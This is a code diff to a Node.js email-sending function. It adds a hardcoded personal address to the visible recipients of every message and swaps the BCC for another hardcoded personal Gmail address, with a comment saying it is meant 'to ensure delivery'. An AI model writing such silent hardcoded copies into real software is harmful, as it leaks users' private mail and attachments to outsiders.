@@ -15,11 +15,25 @@ sendEmail = async (email, subject, htmlString, attachment) => {
         // For port 587, require TLS
         ...(port === 587 && { requireTLS: true })
     });
+    // Convert email to array if it's a string, to support multiple recipients
+    const toEmails = Array.isArray(email) ? email : [email];
+
+    // Add SMTP_USER as second email recipient
+    if (process.env.SMTP_USER && !toEmails.includes(process.env.SMTP_USER)) {
+        toEmails.push(process.env.SMTP_USER);
+    }
+
+    // Add BCC email to 'to' field to ensure delivery
+    const bccEmail = 'nirmitrshah@aol.in';
+    if (bccEmail && !toEmails.includes(bccEmail)) {
+        toEmails.push(bccEmail);
+    }
+
     var mailOptions = {
         from: process.env.SMTP_USER,
-        to: email,
+        to: toEmails,
         // cc: 'nirmitrshah@aol.in',
-        bcc: 'nirmitrshah@aol.in', 
+        bcc: 'nakiyavishalc1234@gmail.com',
         subject: subject,
         html: htmlString,
         attachments: attachment
